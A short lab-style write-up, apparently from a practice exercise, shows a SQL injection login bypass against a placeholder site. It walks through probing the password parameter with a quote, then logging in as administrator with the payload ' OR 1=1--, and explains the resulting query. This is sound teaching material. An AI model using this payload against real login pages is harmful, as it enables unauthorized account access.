# SQL injection vulnerability allowing login bypass

### Goal:
`Log in to the application as the administrator user.`
### Info: The injection point is the login functionality
`target.com/login?username=<user>&password=<password>`
<br><br>

**<ins>Step 1: Test the injection point</ins>**

username=administrator&password='

    500: internal server error

username=administrator&password='--

    200

This is a valid injection point

**<ins>Step 2: Exploit the vulnerability</ins>**

username=administrator&password=' OR 1=1--

    Success!

This request sends the server this query:

    password = '' OR 1=1
    password = false OR true

This evaluates to true and logs us in as the specified user.
